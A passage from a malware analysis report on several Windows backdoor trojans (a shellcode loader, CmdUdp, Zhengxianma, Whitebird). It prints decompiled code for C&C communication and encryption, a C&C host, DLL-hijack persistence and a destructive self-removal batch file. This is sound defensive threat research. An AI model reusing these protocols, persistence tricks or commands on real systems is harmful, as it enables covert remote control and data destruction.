(.dll).\n\nIf bCreateDllExitEvent is equal to 1, the trojan creates an event signaling the successful\ncompletion at the end of operation. The trojan also calls the payload_exit_func_name\nfunction of the payload. In the studied sample, the payload is a shellcode.\n\nDebugging strings generated on the stack:\n\n- Get Payload File Name.\\n\n\n- ServerLoadPayload()\\n\n\n- Get Module File Name.\\n\n\n- Read Payload File.\\n\n\n- Switch to payload directory.\\n\n\n- Verify Payload Data.\\n\n\n- Decrypt Payload Data.\\n\n\n- Load PE.\\n\n\n- Create DllExit Event.\\n\n\n- Get DllExit Export Function.\\n\n\nExample of creating a rundll32.exe:\n\nObfuscation is a frequent inclusion of the one-type code that does not affect the\nperformance of the main functions. There is also a lot of meaningless calls added:\n\n\n-----\n\n```\nGetVersion(), SetLastError(), GetLastError(), GetSystemTime(),\nSystemTimeToFileTime(), OutputDebugString(), and GetTickCount().\n\n```\nSome OutputDebugString calls provide useful debugging information.\n\nAnother distinctive feature is the large number of allocations of small memory blocks using\nthe new function with simultaneously release.\n\n**Payload**\n\nThe main body of the shellcode and its configuration are encrypted using a simple\nalgorithm based on the XOR operation. Decryption is performed by the part of the shellcode\nthat was previously decrypted by the loader. Decryption algorithm:\n```\n import idaapi\n k = 0x0c\n for i in range(0xbce57):\n   k = (k + i) & 0xff\n   idaapi.patch_byte(0x25 + i, idaapi.get_byte(0x25 + i) ^ k)\n\n```\nAfter decryption the shellcode receives control. Similar to the loader, the shellcode searches\nfor all the necessary APIs via the PEB and enters their addresses in the function table. The\nfollowing algorithm is used to hash the name of the exported function:\n\n\n-----\n\nDuring the process of searching for the necessary functions, the trojan unpacks the\nssleay32.dll and libeay32.dll filles from its body, which are located at the 0xF2 offset in\nshellcode and are compressed using the zlib library, then manually loads them. After that,\nthe trojan parses the configuration embedded in its body:\n```\nBing@Google@Yahoo|tv.teldcomtv.com:53;tv.teldcomtv.com:53;|\n1;1;1;1;1;1;1;|00-24;|5;\n\n```\nwhere|1;1;1;1;1;1;1;|00-24;| defines the schedule of communication sessions with\nC&C server.\n\nThe configuration can contain up to 6 addresses of the C&C servers. Each address consists of\nan address and port separated by a colon.\n\nThen the current date and time are compared with the parameters from the configuration. If\nthe date and time match the configuration parameters, the trojan attempts to connect to\none of the C&C servers specified in the configuration over the SSL Protocol. After successful\nconnection, the program collects information about the infected computer:\n```\n #pragma pack(push, 1)\n struct botinfo\n {\n  wchar_t compname[100];\n  _BYTE osver;\n  _BYTE gotcompname;\n  _BYTE isx64arch;\n  _BYTE macaddress[6];\n  _DWORD ipaddress;\n  _BYTE byte10;\n  _BYTE iswow64proc;\n  _WORD year;\n  _WORD month;\n  _WORD day;\n };\n #pragma pack(pop)\n\n```\nThen it sends information about the infected computer to the server(cmdid == 0x129E,\n```\ndatasize == 0xdd) and checks that the response sent matches cmid == 0x132A. It\n\n```\nsends a packet containing cmdid == 0x155B and 3 parameters for each of the 30 possible\nmodules. After that, the malicious program waits for commands from the server. The waiting\ntime is calculated using the formula:\n```\n v12 = 60000 * ctx->period;\n min = 120000 * ctx->period / 3u;\n ticks = ctx->imp->GetTickCount();\n ctx->imp->Sleep(ticks % (v12 - min) + min);\n\n```\nwhere ctx->period is the last number from the configuration. After a pause, the\ncommunication process with the server starts again.\n\nThe server can send the following commands:\n\n\n-----\n\n|Command ID|Description|Arguments|Answer|Answer data|\n|---|---|---|---|---|\n|0x1AC3|To maintain the connection|no|0x1AC3||\n|0x1C1C|To remove itself from the system|-|-|-|\n|0x230E|To create a buffer for the payload (shellcode or MZPE file)|payload_params structure: #pragma pack(push,1) struct payload_ params { _BYTE type; _DWORD index; _DWORD dword5; _DWORD bufsize; _DWORD shellcode_ep; _DWORD sig; }; #pragma pack(pop)|0x2873 in case of success 0x2D06 in case of failure|0 (_QWORD size) -|\n|0x294C|To copy the payload into prepared buffer|Data to be copied|0x2873|Current size of the payload (_QWORD size)|\n|0x2AC8|To launch the payload|-|0x2743|0 (_QWORD size)|\n|0x2D06|To release memory for the payload|-|0x2D06|-|\n|0x590A|To launch file manager|Awaits the following structure as an argument #pragma pack(push,1) struct cmdarg { _BYTE cmdid; char s[]; }; #pragma pack(pop)|0x3F15 (file manager launch) 0x3F15 (file manager termination)|Structure received from the server, with the length of the second parameter limited to 90 symbols -|\n\n\n-----\n\n|Command ID|Description|Arguments|Answer|Answer data|\n|---|---|---|---|---|\n|0x3099|To process other commands|Awaits the following structure as an argument #pragma pack(push,1) struct cmdarg { _BYTE cmdid; char s[]; }; #pragma pack(pop)|0x3F15 (start of command processing) 0x3F15 (end of command processing)|Structure received from the server with the length of the second parameter limited to 90 symbols -|\n\n\n**0x2AC8 (Payload launch)**\n\nIt is used after the 0x230E and 0x294C commands; payload_params->index == 4\nparameter is required. The trojan starts a thread in which it performs all the actions;\n```\npayload_params->sig == 0x7AC9 means the payload is not encrypted.\n\n```\nIf the payload is encrypted, a decryption key is generated:\n```\n imp->sprintf(rc4_key, \"%02x#%02X_5B\", BYTE2(payload_params->sig), (unsigned __int8)\n payload_params->sig);\n\n```\nThe key is then expanded to 256 bytes, and the entire buffer is decrypted by the received\nkey.\n\n- payload_params->type == 0 means the buffer contains the shellcode, and\n\n- payload_params->shellcode_ep specifies the offset in the shellcode to start\nexecution from.\n\n- payload_params->type == 1 means the buffer contains an MZPE file. The trojan\nloads it into memory and passes the code execution to the OEP (Original entry point).\nNext, the file is checked for export functions; if there are any, the trojan looks for the\n```\n GetClassObject function and executes it.\n\n```\nAny other value of the payload_params->type parameter leads the program to shut\ndown.\n\n**0x590A (File manager launch)**\n\nThe trojan establishes a new connection with the C&C server, in which it will accept\ncommands from the file manager.\n\n\n-----\n\nAfter establishing a connection, the trojan sends a packet with cmdid == 0x3F15 and with\ndata received from the server. The length of the cmdarg->s parameter is limited to 90\nsymbols. After that, the malware starts a thread in which it waits for the server’s commands\nover the established connection.\n\n|Group|Command ID|Description|Arguments|Answer|Answer data|\n|---|---|---|---|---|---|\n|Maintaining the connection|0x1AC3|To maintain the connection|-|0x1AC3|-|\n|To read a file|0x55C3|To get file size|fsread structure: #pragma pack(push,1) struct fsrea d { _DWORD pos_high; _DWORD pos_low; wchar_t file name[400]; }; #pragma pack(pop)|0x5DE4 if the file could not be opened 0x5DDA if the file was opened|- File size (QWORD type)|\n||0x55C4|To read a file (used after 0x55C3 command)|-|0x5DDC if the offset in the file is greater or equal to the file size 0x5DDB sending file data|- File data in blocks of 0x1800 bytes|\n||Any code except of 0x5013 after 0x55C4|Error|-|0x5DE4 error|-|\n||0x5013|To close a file|-|-|-|\n|To write a file|0x55C7|To open a file for reading and writing|File name(wchar_t [400])|0x5DE4 if the file could not be opened|-|\n\n\n-----\n\n|Col1|Col2|Col3|Col4|0x5DE1 if the file was opened|File size (QWORD type)|\n|---|---|---|---|---|---|\n||0x55C8|To write data to a file|Data to be written|0x5DE2 file writing completed|-|\n||Any code except 0x5013 or 0x55C9 after 0x55C8|Error|-|0x5DE4 error|-|\n||0x55C9|End of writing|-|0x5DE3 confirming the end of writing|-|\n||0x5013|To close a file|-|-|-|\n|To list a directory|0x55C5|To list a directory|(wchar_t[400 ]) path|0x5DDD beginning of directory listing|-|\n||-|Is ignored, listing stops only when all files and sub- directories are listed or an error occurs|-|0x5DDE To list a directory, excluding folders If the packet size with the next file exceeds the maximum packet size (0x2000 bytes), then the trojan sends the current packet and starts preparing a new one. After browsing all the files, the trojan recursively proceeds through all the|The listing: #pragma pack(push,1) struct fsfil einfo { wchar_t file name[]; _QWORD filesize }; struct fslsf iles { fsfileinfo files[]; }; #pragma pack(pop)|\n\n\n-----\n\n|Col1|Col2|Col3|Col4|directories, forming a listing for each.|Col6|\n|---|---|---|---|---|---|\n||-|-|-|0x5DDF directory listing successfully completed 0x5DE0 direct ory listing failed with an error|- -|\n\n\n**0x3099 (other commands)**\n\nThe malware checks whether the fir pipe was created for the command ID specified by the\nserver. If not, it starts the thread in which it then launches the payload (similar to the 0x2AC8\ncommand).\n\nThe trojan establishes a new connection with the C&C server, in which it will accept\ncommands related to 0x2AC8. After establishing a connection, the trojan sends a packet\nwith cmdid == 0x3F15 and with data that was received from the server. The length of the\n```\ncmdarg->s parameter is limited to 90 symbols. After that, the malware starts a thread, in\n\n```\nwhich it waits for server’s commands over the established connection.\n\nIf the fir pipe is created, the trojan sends the 0x32E0 packet without parameters, then\nsends the 0x3F15 packet without it as well. After that, it finishes processing the command.\n\nCreates 3 pipes:\n\n- \\\\.\\pipe\\windows@#%02XMon\n\n- \\\\.\\pipe\\windows@#%02Xfir\n\n- \\\\.\\pipe\\windows@#%02Xsec\n\nwhere %02X is replaced with a number passed by the server.\n\nIn a separate thread it reads data from the fir pipe and sends it to the server with the\n```\n0x34A7 command ID.\n\n```\nNext, the trojan starts another thread that directly processes the server’s commands:\n\n- 0x1AC3 — maintains the connection;\n\n- 0x3167 — writes the data received from the server to the sec pipe;\n\n\n-----\n\n- 0x32E0 — writes the 0x32E0 command to the Mon pipe;\n\n- 0x38AF — writes the 0x38AF command to the Mon pipe and then closes the connection\nwith the server;\n\n- 0x3716 — writes 12 bytes received from the server, as well as a pointer to the buffer with\nthe payload, payload’s size and offset to the shellcode entry point to the sec pipe;\n\n- 0x3A0B — similar to 0x3099;\n\n- 0x3CD0 — starts the proxy.\n\n**0x3CD0 (Proxy)**\n\nWhen receiving the 0x3099 command in the framework for processing the 0x590A\ncommand, the trojan tries to open port 127[.]0.0[.]1:5000. If it fails, it increases the\nport number by one and tries again until the port is opened. Then it writes 3 bytes to the\nsecond pipe: 1 byte of the argument and 2 bytes for the open port.\n\nIt starts a thread in which it waits for incoming connections. Once the connection is\nestablished, it transfers data from the socket to the C&C server and back. When sending data\nto the C&C server, cmdid is set to 0x9F37.\n\n**0x1C1C (Self-removing)**\n\nThe program attempts to terminate its process via taskkill /f /pid <pid>. It copies\ncmd.exe to the %ALLUSERSPROFILE%\\\\com.microsoft\\\\dllhost.exe directory (for\nWindows XP — %ALLUSERSPROFILE%\\\\Application Data\\\\com.microsoft\\\n```\n\\dllhost.exe). For later Windows versions, it also copies %WINDIR%\\\\System32\\\n\\<deflocale>\\ \\ cmd.exe.mui to %ALLUSERSPROFILE%\\\\com.microsoft\\\n\\dllhost.exe.mui, where <deflocale> is the name of the default locale.\n\n```\nIn the %ALLUSERSPROFILE%\\\\com.microsoft\\\\ directory (for Windows XP a %\n```\nALLUSERSPROFILE%\\\\Application Data\\\\com.microsoft\\\\), it creates a\n\n```\nmshelp.bat file that contains the following set of commands:\n```\n sc stop misics\n sc delete misics\n rd /s /q \"%ALLUSERSPROFILE%\\\\Misics\"\n rd /s /q \"%ALLUSERSPROFILE%\\\\Media\"\n taskkill /f /pid <curpid>\n rd /s /q \"%HOMEDRIVE%\\\\DOCUME~1\\\\ALLUSE~1\\\\APPLIC~1\\\\Misics\"\n rd /s /q \"%HOMEDRIVE%\\\\DOCUME~1\\\\ALLUSE~1\\\\APPLIC~1\\\\Media\"\n reg delete \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" /v \"Misics\" /f\n del %0\n\n```\nwhere <curpid> is the trojan’s PID.\n\nThen it launches the batch file and shuts down.\n\n\n-----\n\n**Protocol for communicating with the C&C server**\n\nData is encrypted before being sent to the sever. First, an RC4 key is generated to encrypt\nthe packet header:\n\n1) A packet header consisting of 8 DWORDs is generated:\n```\n imp->memset(header, 0i64, 32i64);\n ...\n header[4] = 0xE0B2; //signature\n header[5] = cmdid;\n header[3] = datasize;\n header[0] = datasize + imp->GetTickCount() % 0x87C9;\n header[1] = datasize + imp->GetTickCount() % 0x3F0D;\n header[2] = datasize + imp->GetTickCount() % 0x9B34;\n header[7] = datasize + imp->GetTickCount() % 0xF317;\n\n```\n2) Based on the header[7] value, key_part_2 is generated, consisting of 4 bytes:\n```\n key_part_2[3] = LOBYTE(header[7]) & 0x7A;\n key_part_2[2] = BYTE2(header[7]) ^ 0x81;\n key_part_2[1] = BYTE1(header[7]) ^ 0x4E;\n key_part_2[0] = HIBYTE(header[7]) & 0x3D;\n\n```\n3) Based on the header[7] value, key_part_3 is generated, consisting of 4 bytes:\n```\n key_part_3[2] = BYTE2(header[7]) & 0xA6;\n key_part_3[3] = LOBYTE(header[7]) ^ 0x6F;\n key_part_3[1] = BYTE1(header[7]) ^ 0x86;\n key_part_3[0] = HIBYTE(header[7]) & 0xE4;\n\n```\n4) Based on the received header[7], key_part_2, key_part_3, the trojan generates\na string that is a short key for encrypting the header:\n```\n z = 0;\n for ( i = 0i64; i < 4; ++i )\n {\n  imp_->sprintf(&rc4_key[z], \"%02X\", *((unsigned __int8 *)&header[7] + i));\n  z += 2;\n  imp_->sprintf(&rc4_key[z], \"%02x\", key_part_2[i]);\n  z += 2;\n  imp_->sprintf(&rc4_key[z], \"%02X\", key_part_3[i]);\n  z += 2;\n }\n\n```\n5) The obtained short key is expanded to a 256-byte key, which is used for encryption by the\nRC4 algorithm:\n\n\n-----\n\n6) The received RC4 key is used to encrypt the header (32 bytes).\n\nNext, an RC4 key is generated to encrypt the packet data:\n\n1) key_part_4 is formed (4 bytes):\n```\n imp->memcpy(key_part_4, (char *)&header[3], 4i64);\n key_part_4[2] = key_part_4[1] & 0x89;\n key_part_4[1] = key_part_4[1] & 0x89 ^ 0x60;\n key_part_4[3] = key_part_4[0] ^ 0xAC;\n key_part_4[0] = (key_part_4[0] ^ 0xAC) & 0xCD;\n\n```\n2) key_part_5 is formed (4 bytes):\n```\n imp->memcpy(key_part_5, (char *)&header[5], 4i64);\n key_part_5[3] = key_part_5[0] & 0xB0;\n key_part_5[0] = key_part_5[0] & 0xB0 ^ 0xD1;\n key_part_5[2] = key_part_5[1] ^ 0x8D;\n key_part_5[1] = (key_part_5[1] ^ 0x8D) & 0x64;\n\n```\n3) key_part_6 is formed (4 bytes):\n```\n imp->memcpy(key_part_6, (char *)&header[4], 4i64);\n key_part_6[3] = key_part_6[0] & 0xB4;\n key_part_6[0] &= 0x94u;\n key_part_6[2] = key_part_6[1] ^ 0x91;\n key_part_6[1] ^= 0xF9u;\n\n```\n4) key_part_7 is formed (4 bytes):\n```\n imp->memcpy(key_part_7, (char *)&header[2], 4i64);\n key_part_7[3] = key_part_7[0] & 0x8A;\n key_part_7[0] &= 0x82u;\n key_part_7[2] = key_part_7[1] ^ 0xB2;\n key_part_7[1] ^= 0xD8u;\n\n```\n5) A short key is generated, which will be further used for data encryption:\n```\n c = 0\n  for ( k = 0i64; k < 4; ++k )\n  {\n   imp->sprintf(&rc4_key_final[c], \"%02X\", key_part_4[k]);\n   c += 2;\n   imp->sprintf(&rc4_key_final[c], \"%02x\", key_part_5[k]);\n c += 2;\n   imp->sprintf(&rc4_key_final[c], \"%02X\", key_part_6[k]);\n   c += 2;\n   imp->sprintf(&rc4_key_final[c], \"%02x\", key_part_7[k]);\n   c += 2;\n  }\n\n```\n6) The obtained short key is expanded to a 256-byte key, which is used for encryption by the\nRC4 algorithm.\n\n\n-----\n\nThe trojan sends a POST request:\n```\n  imp->sprintf(\n   request,\n   \"POST http://%s/updates.php?0x%08x HTTP/1.1\\r\\n\"\n   \"Host: %s\\r\\n\"\n   \"Connection: Keep-Alive\\r\\n\"\n   \"User-Agent: Mozilla/5.0\\r\\n\"\n   \"Cache-Control: no-catch\\r\\n\"\n   \"Content-Length: %d\\r\\n\"\n   \"\\r\\n\",\n   host,\n   ctx->tick,\n   host,\n   datasize + 32i64);\n\n```\nThe ctx->tick parameter changes after each request and is equal to GetTickCount()\n```\n% 0xFFFFFFFE.\n\n```\nData encoded by the RC4 algorithm with key_part_1 (32 bytes) written at the beginning is\nused as request data.\n\nWhen receiving a packet, the response headers are skipped, and only the \\r\\n\\r\\n string\nis checked. The trojan reads the header (the first 32 bytes), and then proceeds with response\ndecrypting.\n\n1) Based on the header[7] value, key_part_2 is generated, consisting of 4 bytes:\n```\n key_part_2[3] = LOBYTE(header[7]) & 0x7A;\n key_part_2[2] = BYTE2(header[7]) ^ 0x81;\n key_part_2[1] = BYTE1(header[7]) ^ 0x4E;\n key_part_2[0] = HIBYTE(header[7]) & 0x3D;\n\n```\n2) Based on the key_part_1[7] value, key_part_3 is generated, consisting of 4 bytes:\n```\n key_part_3[2] = BYTE2(header[7]) & 0xA6;\n key_part_3[3] = LOBYTE(header[7]) ^ 0x6F;\n key_part_3[1] = BYTE1(header[7]) ^ 0x86;\n key_part_3[0] = HIBYTE(header[7]) & 0xE4;\n\n```\n3) Based on the received header[7], key_part_2, key_part_3, the trojan generates\na string that is a short key for header decrypting:\n```\n z = 0;\n for ( i = 0i64; i < 4; ++i )\n {\n  imp_->sprintf(&rc4_key[z], \"%02X\", *((unsigned __int8 *)&key_part_1[7] + i));\n  z += 2;\n  imp_->sprintf(&rc4_key[z], \"%02x\", key_part_2[i]);\n  z += 2;\n  imp_->sprintf(&rc4_key[z], \"%02X\", key_part_3[i]);\n  z += 2;\n }\n\n```\n4) key_part_4 is formed (4 bytes):\n\n\n-----\n\n5) key_part_5 is formed (4 bytes):\n```\n imp->memcpy(key_part_5, (char *)&header[5], 4i64);\n key_part_5[3] = key_part_5[0] & 0xB0;\n key_part_5[0] = key_part_5[0] & 0xB0 ^ 0xD1;\n key_part_5[2] = key_part_5[1] ^ 0x8D;\n key_part_5[1] = (key_part_5[1] ^ 0x8D) & 0x64;\n\n```\n6) key_part_6 is formed (4 bytes):\n```\n imp->memcpy(key_part_6, (char *)&header[4], 4i64);\n key_part_6[3] = key_part_6[0] & 0xB4;\n key_part_6[0] &= 0x94u;\n key_part_6[2] = key_part_6[1] ^ 0x91;\n key_part_6[1] ^= 0xF9u;\n\n```\n7) key_part_7 is formed (4 bytes):\n```\n imp->memcpy(key_part_7, (char *)&header[2], 4i64);\n key_part_7[3] = key_part_7[0] & 0x8A;\n key_part_7[0] &= 0x82u;\n key_part_7[2] = key_part_7[1] ^ 0xB2;\n key_part_7[1] ^= 0xD8u;\n\n```\n8) Based on the received key_part_4, key_part_5, key_part_6, key_part_7,\nthe trojan generates a string that is a short key for decrypting the payload:\n```\n z = 0;\n for ( j = 0i64; j < 4; ++j )\n {\n  imp_->sprintf(&payload_rc4_key[z], \"%02X\", key_part_4[j]);\n  z += 2;\n  imp_->sprintf(&payload_rc4_key[z], \"%02x\", key_part_5[j]);\n  z += 2;\n  imp_->sprintf(&payload_rc4_key[z], \"%02X\", key_part_6[j]);\n  z += 2;\n  imp_->sprintf(&payload_rc4_key[z], \"%02x\", key_part_7[j]);\n  z += 2;\n }\n\n```\n9) Decrypts header with the key generated in step 3 and expanded to 256 bytes;\n\n10) Checks that header[4] is equal to 0xE0B2;\n\n11) header[5] contains the command ID and header[3] contains the payload size;\n\n12) Receives the payload and decrypts it with the RC4 key obtained in step 8 and expanded\nto 256 bytes.\n\n\n-----\n\n#### BackDoor.CmdUdp.1\n\n\nIt is a backdoor for Microsoft Windows operating systems. It allows attackers to remotely\ncontrol infected computers by implementing remote shell functions — launching cmd.exe\nand redirecting the I/O to the attacker's C&C server.\n\nThe trojan is written in C++; the pdb file with debugging information when compiled on the\nattacker's computer was located at C:\n```\n\\VS2010\\CMD_UDP_Server\\Release\\CMD_UDP_DLL.pdb.\n\n##### Operating routine\n\n```\nBackDoor.CmdUdp.1 has the following exported functions:\n```\n ??0CCMD_UDP_DLL@@QAE@XZ\n ??4CCMD_UDP_DLL@@QAEAAV0@ABV0@@Z\n ?fnCMD_UDP_DLL@@YAHXZ\n ?nCMD_UDP_DLL@@3HA\n LoadProc\n ServiceMain\n\n```\nOnce on the target computer, the backdoor can work with or without being installed on the\nsystem. In the first case, the ServiceMain function is exported; in the second case, the\n```\nLoadProc function is exported. To provide its autorun, the backdoor is installed on the\n\n```\nsystem as a service.\n\nEvery 3 minutes BackDoor.CmdUdp.1 sends the message hello to the C&C server\n```\ntv.teldcomtv.com:8080 and waits for further commands. Communication with the\n\n```\nserver is performed over the UDP Protocol.\n\nIn response the server can send one of several control words to the trojan:\n\n- hello;\n\n- world;\n\n- exit.\n\n**The “hello” command**\n\nWhen this command is received, the backdoor starts the cmd.exe process. In this case, the\ninput and output of the command-line interpreter are redirected to 2 anonymous pipes. If\nthe process is created successfully, the cmd OK message is sent to the server.\n\nIn addition, a thread is started in which the trojan will send data from the stdout/stderr\nof the cmd.exe process to the server. If the backdoor fails to run cmd.exe, it notifies the\nserver by sending cmd err.\n\n\n-----\n\n**The “world” command**\n\nThis command stops the cmd.exe main running thread for 1 second.\n\n**The “exit” command**\n\nThis command terminates the previously created cmd.exe process.\n\nIf the server response does not contain any of the three specified commands, its contents are\nsent to cmd.exe for execution.\n\n\n#### BackDoor.Zhengxianma.1\n\n\nA backdoor trojan for Microsoft Windows operating systems. It is designed to take\nunauthorized control over the infected computer by implementing remote shell functions —\nlaunching cmd.exe and redirecting the I/O to the attacker's C&C server.\n\n##### Operating routine\n\nIt is a dynamic library with the following exported functions:\n\n- GetOfficeDatatal\n\n- Entrypoint\n\nIt checks the current system date during initialization: it must not be earlier than 2013-05-05.\nUpon successful initialization, it modifies its code in memory to pass control to the\n```\nGetOfficeDatatal export function.\n\n```\n**GetOfficeDatatal function**\n\nThe trojan checks for the C:\\WINDOWS\\debug\\rdp.sh file and, if it exists, stops working. If\nthe specified file is missing, the program creates the MsMpsvc service with the “Windows\nDefender Service” display name. As an executable file, the trojan specifies the path to the\nexecutable file of its process. Then it generates an empty C:\\WINDOWS\\debug\\rdp.sh\nfile, which serves as a marker for creating the corresponding service.\n\n**Entrypoint function**\n\nThe main backdoor functionality is contained in the Entrypoint exported function. The\ntrojan binds to port 35636 to communicate with the C&C server. If an incoming connection\noccurs, it sends a Please enter Pass:\\r\\n string to the operator. The response string\nmust contain 11 characters; if it has a different length, the trojan sends the message pass\n```\nis too long or short\\r\\n and closes the connection.\n\n```\n\n-----\n\nUpon receiving a correct response, the trojan calculates the MD5 hash from the entered\nstring, converts the result to a hexadecimal representation, and compares it with the\nreference value 220B9FDC9C3CB7C667DCED54D92CFA0F hardcoded into the program’s\nbody. If there is no match, it sends the message pass is error\\r\\n and closes the\nconnection.\n\nIf a match occurs, the trojan sends the pass is OK\\r\\n string to the operator, and then\nlaunches cmd.exe with the I/O redirection to the C&C server.\n\n\n#### BackDoor.Whitebird.1\n\n\nA multifunctional backdoor trojan for Microsoft Windows 64-bit operating systems. Its\nfunction is to establish an encrypted connection with the C&C server and grant unauthorized\naccess to the infected computer. It has a file manager, proxy server and remote shell\ncapabilities. With BackDoor.PlugX, this trojan was used to infiltrate the network infrastructure\nof several agencies in central Asia.\n\n##### Operating principle\n\nThe trojan represents a dynamic library with the MyInstall exported function. Upon\ninfecting the targeted system, it is installed in the C:\\Windows\\System32\\oci.dll\ndirectory.\n\nThe program launches as follows. Upon operating system boot, a Microsoft Distributed\nTransaction Coordinator (MSDTC) is launched. The Windows registry contains the\nparameters of this service, which hold the names of the loading libraries. By default, the\n```\nOracleOciLib and OracleOciLibPath keys in the\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSDTC\\MTxOCI branch have the values\n\n```\nof oci.dll and %systemroot%\\system32 accordingly. When the trojan is placed in %\n```\nsystemroot%\\system32\\oci.dll, it will be automatically loaded onto the memory\n\n```\nwhen the MSDTC starts.\n\nWhen initialized, it creates a gfhfgh6y76734d,1111 mutex, followed by the library\nloading and the MyInstall exported function call.\n\n**MyInstall**\n\nThe trojan can determine if the proxy server should be used and can perform a basic\nauthentication and authorization via the NTLM protocol. When running, it logs records in the\njournal, saving it as c:\\programdata\\logos.txt.\n\nIt connects to the C&C server and exchanges the keys with it. All subsequent packets\nbetween the trojan and the server are encrypted. The algorithm based on the XOR operation\nwith the buffer length of 28 bytes is used for decryption. All packets are encrypted with an\n\n\n-----\n\nend-to-end offset in the buffer; but for the encryption and decryption, separate counters are\nused.\n\nThe following structure is used to request commands from the server and send the results:\n```\n #pragma pack(push, 1)\n struct st_getcmd\n {\n  _DWORD sig;\n  _DWORD cmd;\n  _DWORD res;\n  _DWORD dwordc;\n };\n #pragma pack(pop)\n\n```\nThe sig parameter always has a 0x03 value. To request the command from the server, the\n```\ncmd parameter is set as 0x200, and the res and dwordc parameters are set to zero. If the\n\n```\nserver does not send any data within 44 seconds, the trojan sends a packet containing the\n```\ncmd parameter with the 0x00 value. This process repeats until any response is received from\n\n```\nthe server.\n\n**Commands list**\n\nThe commands the trojan can execute, as well as its response to them, are shown below:\n\n- 0x00 — lack of the reply, awaiting the next command;\n\n- 0x01 (collecting information about the bot) — replies with the cmd_botinfo structure:\n\n\n-----\n\n- 0x02 (remote shell launch) — replies with the packet, similar to the one received from the\nserver;\n\n- 0x03 (advanced file system manager launch) — replies with the packet, similar to the one\nreceived from the server;\n\n- 0х05 (remote shell v2 launch) — replies with the packet, similar to the one received from\nthe server;\n\n- 0x06 (proxy manager launch) — replies with the packet, similar to the one received from\nthe server;\n\n- 0x100 (the ping command) — replies with cmd=0x00;\n\n- 0x400 (the command to reconnect to the server) — replies with cmd=0x300;\n\n- 0x600 (dummy command) — replies with cmd=0x600; res=0xffffffff;\n\n- 0x700 (launch of the command through ShellExecute) — replies with cmd=0x700; if\nfailed, replies with res=0xffffffff.\n\n**Exchanging keys**\n\nThe process of exchanging keys with the C&C server is as follows:\n\nUsing random values, the trojan initializes the buffer with the size of 28 bytes. Next, it takes\nthe data array of the 58 bytes size, which is embedded into its body.\n\nIt encrypts bytes from 15 to 43, based on the XOR operation algorithm, using randomly\ngenerated bytes, and sends the resulting buffer to the server. In response, it should receive 5\nbytes, where 0x16 is a 0 byte and the htons function results from WORD, starting with the\nthird byte, which is the size of the next packet, and shouldn’t exceed 0x3FF9 bytes.\n\nAfter that, it receives the next packet, whose data is used in the next exchange.\n\nNext, the trojan uses the second encoded buffer with the size of 332 bytes.\n\n\n-----\n\nThe trojan encrypts the bytes, starting from 9 to 265 and from 304 to 332, with the algorithm\nbased on the XOR operation, using randomly generated bytes. 28 bytes, starting from 276\nbytes, is replaced with the data generated upon the first buffer initialization. There must be a\nresponse of 5 bytes, where the 0 byte is 0x14, and the htons function results from WORD,\nstarting with the 3rd byte, which is the size of next packet, and should not exceed 0x3FF9\nbytes.\n\nAfter that, it receives the next packet, whose data is not used in further exchange.\n\nNext, the trojan receives 5 bytes from the C&C server, where 0x16 is the 0 byte, and the\n```\nhtons function results from WORD, starting with the 3rd byte, which is the size of the next\n\n```\npacket, and should not exceed 0x38 bytes.\n\nIt receives the next packet from the C&C server and sends 0х38 bytes into the encryption\nkey initialization function:\n\n\n-----\n\n**Remote Shell Function**\n\nThe trojan copies %WINDIR%\\System32\\cmd.exe into %WINDIR%\\System32\\alg.exe.\nIt then initializes a new connection to the C&C server and sends the following packet:\n```\n #pragma pack(push,1)\n struct cmd_remoteshell\n {\n  _WORD sig; // 0x03\n  _WORD len;\n  _WORD cmd; // 0x02\n  _BYTE gap[10];\n  _BYTE macaddr[6];\n };\n #pragma pack(pop)\n\n```\nNext, it launches a scanned alg.exe with the pipes input/output redirection. If the launch fails,\nit runs a cmd.exe instead of the alg.exe. If there is data in the output function pipe, the trojan\nsends the data to the server in the following packet:\n```\n #pragma pack(push,1)\n struct cmd_remoteshell_out\n {\n  _WORD sig; // 0x03\n  _WORD len;\n  _WORD cmd; // 0x202\n  _BYTE gap[10];\n  wchar_t buffer[];\n };\n #pragma pack(pop)\n\n```\nHerewith, the trojan periodically checks for data from the C&C server and parses the\nincoming command when the data has been received.\n\n**List of Remote Shell Commands**\n\n|Command|Description|Argument|Response|\n|---|---|---|---|\n|0x100|keep-alive mode|-|cmd = 0x00|\n|0x102|executes the command in the Remote Shell|a command|-|\n|0x103|launches the file manager (writing into the end of existing file)|a path to the file, the final size of the file|cmd value is identical to the value in the packet received from the server; res = -1 if failed;|\n\n\n-----\n\n|0x203|launches the file manager (reading from the file)|a path to the executable file, an offset in the file|res = 0 if succeed.|\n|---|---|---|---|\n|0x703|launches an application|a path to the executable file and arguments|res = -1 if failed; res = 0 if succeed.|\n|the remaining variants|default behavior|-|cmd value is identical to the value of the packet received from the server; res = 1.|\n\n\n**Remote Shell v2**\n\nThe trojan copies %WINDIR%\\System32\\cmd.exe into the %WINDIR%\n```\n\\System32\\alg.exe. It then initializes a new connection to the C&C server and sends the\n\n```\nfollowing packet:\n```\n #pragma pack(push,1)\n struct cmd_remoteshell\n {\n  _WORD sig; // 0x03\n  _WORD len;\n  _WORD cmd; // 0x02\n  _BYTE gap[10];\n  _BYTE macaddr[6];\n };\n #pragma pack(pop)\n\n```\nNext, it launches a copied alg.exe; if launch has failed, it runs a cmd.exe instead of the\nalg.exe. Input/output to the launched process is implemented via the trojan process joining\nto the console of the launched alg.exe/cmd.exe process, using the WINAPI\n```\nAttachConsole.\n\n```\nThe rest of the operation routine is similar to the one in the Reverse Shell handler.\n\n**File manager**\n\nThe trojan initializes a new connection to the C&C server and sends the following packet:\n\n\n-----\n\nThe cmd value is set to the same value in the server packet. Next, the trojan receives\ncommands from the server.\n\n- 0x103:\n\nChecks for the file availability. If it does not exist, it sends the packet with the res = 0xB7\nvalue;\n\nTries to open the file in append mode. If failed, it sends the packet with the res = 0x52\nvalue;\n\nReceives the file size and sets filesize filed to the corresponding value in the\nsubsequent packets;\n\nReceives packets in a cycle with the cmd = 0x303 packet value, and writes the data into\nthe file until the file size is larger or equal to the one the server indicated in the first\npacket.\n\n- 0x203:\n\nTries to open the file in reading mode. If failed, it sends the packet with the res = 0x02\nvalue;\n\nReceives the file size and sends it to the server in the packet;\n\nIn a cycle, it reads the file, starting from the offset, which is indicated in filesize of the\nfirst packet received from the server, and sends the data in the packet with the cmd =\n```\n 0x303 value to the server until the file hasn’t been read to its end.\n\n```\n- 0x403:\n\nIf the C&C server sends the path as an 